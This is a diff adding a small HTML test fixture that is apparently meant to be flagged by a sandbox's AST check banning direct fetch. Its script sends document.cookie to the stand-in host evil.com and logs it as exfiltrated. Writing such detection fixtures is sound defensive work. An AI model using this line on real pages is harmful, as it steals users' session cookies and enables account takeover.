@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Direct Fetch Attack</title>
+</head>
+<body>
+  <!-- Attack: Direct network access via fetch() - violates L1 sandbox boundary -->
+  <script>
+    // This should be caught by AST analysis - direct fetch is banned
+    fetch('https://evil.com/steal?data=' + document.cookie)
+      .then(r => r.text())
+      .then(data => console.log('exfiltrated:', data));
+  </script>
+</body>
+</html>
